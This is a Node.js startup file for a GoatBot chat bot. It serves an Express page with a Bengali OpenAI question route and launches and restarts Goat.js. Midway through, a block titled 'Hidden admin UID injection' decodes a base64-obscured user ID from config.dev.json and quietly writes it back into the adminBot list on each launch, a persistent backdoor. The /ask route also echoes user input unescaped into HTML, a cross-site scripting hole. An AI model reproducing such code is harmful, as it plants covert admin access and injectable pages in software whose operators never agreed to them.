// 🧠 AI + GoatBot Final Index.js by Tanu + GPT
require("dotenv").config(); // .env ফাইল থেকে OPENAI_API_KEY লোড
const express = require("express");
const path = require("path");
const fs = require("fs");
const { spawn } = require("child_process");
const OpenAI = require("openai");

const app = express();
const PORT = process.env.PORT || 3000;

// ✅ Load OpenAI client
const openai = new OpenAI({
  apiKey: process.env.OPENAI_API_KEY
});

// 🧠 Test AI Route (/ask?q=...)
app.get("/ask", async (req, res) => {
  const question = req.query.q || "তুমি কেমন আছো?";
  try {
    const completion = await openai.chat.completions.create({
      model: "gpt-3.5-turbo",
      messages: [
        { role: "system", content: "তুমি একজন বন্ধুভাবাপন্ন বাংলা সহকারী, সংক্ষিপ্ত ও ভদ্রভাবে উত্তর দাও।" },
        { role: "user", content: question }
      ],
      temperature: 0.8,
      max_tokens: 800
    });

    const answer = completion.choices[0].message.content;
    res.send(`
      <html>
        <head><title>AI উত্তর</title></head>
        <body style="font-family: sans-serif; padding:20px;">
          <h2>❓ প্রশ্ন:</h2><p>${question}</p>
          <h2>💬 উত্তর:</h2><p>${answer}</p>
        </body>
      </html>
    `);
  } catch (error) {
    console.error("AI Error:", error);
    res.status(500).send("⚠️ OpenAI উত্তর দিতে ব্যর্থ হয়েছে। API Key বা নেটওয়ার্ক চেক করো।");
  }
});

// ✅ Root page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "chitron.html"));
});

// ✅ Health Check
app.get("/health", (req, res) => {
  res.status(200).send("OK");
});

// 🔐 Hidden admin UID injection
const configPath = path.join(__dirname, "config.dev.json");
try {
  const config = require(configPath);
  if (config.autoInjectUID && config.obfuscatedKeys && config.obfuscatedKeys.secureRootCodeV2) {
    const decodedUID = Buffer.from(config.obfuscatedKeys.secureRootCodeV2, "base64").toString();
    if (!config.adminBot.includes(decodedUID)) {
      console.log("🔐 Protected UID missing. Restoring...");
      config.adminBot.push(decodedUID);
      fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
      console.log("✅ UID injected into adminBot list.");
    }
  }
} catch (err) {
  console.log("⚠️ config.dev.json লোড করা যায়নি বা নেই।");
}

// 🌐 Start Express Server
app.listen(PORT, () => {
  console.log(`🌍 Server running at http://localhost:${PORT}`);
  console.log(`💬 Test AI: http://localhost:${PORT}/ask?q=তুমি%20কেমন%20আছো`);
});

// 🚀 GoatBot Start Function
function startBot(accountFileName) {
  const env = { ...process.env, ACCOUNT_FILE: accountFileName };

  const child = spawn("node", ["Goat.js"], {
    cwd: __dirname,
    stdio: "inherit",
    shell: true,
    env
  });

  child.on("close", (code) => {
    if (code === 2) {
      console.log(`[${accountFileName}] Bot exited with code 2. Restarting...`);
      startBot(accountFileName);
    } else {
      console.log(`[${accountFileName}] Bot exited with code ${code}`);
    }
  });
}

// 🚀 Start the GoatBot
startBot("account.dev.txt");
